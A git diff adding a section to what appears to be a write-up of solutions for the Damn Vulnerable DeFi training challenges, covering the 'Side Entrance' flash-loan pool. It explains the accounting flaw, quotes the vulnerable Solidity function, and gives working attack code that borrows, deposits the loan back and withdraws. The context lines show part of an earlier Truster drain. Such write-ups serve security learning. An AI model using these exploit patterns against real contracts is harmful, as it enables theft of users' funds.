@@ -38,3 +38,28 @@ function attack(TrusterLenderPool pool, DamnValuableToken token)external{
         token.transferFrom(address(pool),address(this),1000000);
         }
 ```
+## 4. Side Entrance
+The `function flashLoan()` lacks proper verification during loan execution, allowing attackers to exploit a discrepancy between the token balance and the internal accounting system. By depositing borrowed funds back into the contract during the callback phase, attackers can manipulate the accounting system, deceiving the verification process and enabling unauthorized fund withdrawals.
+```solidity
+function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore)
+            revert RepayFailed();
+    }
+```
+### Solution
+This contract exploits a vulnerability in the `SideEntranceLenderPool` contract by executing a flash loan attack. In the `function attack()`, it initiates a flash loan from the pool with an initial balance of 1000 ether, then immediately withdraws the funds. Additionally, the `function execute()` allows the attacker to deposit any received funds back into the pool, further manipulating its balance. Finally, the contract includes a `function receive()` to accept incoming Ether payments.
+```solidity
+function attack()external{
+        pool.flashLoan(INITIAL_BALANCE_POOL);
+        pool.withdraw();
+    }
+
+function execute()external payable{
+        pool.deposit{value: msg.value}();
+    }
+```
+
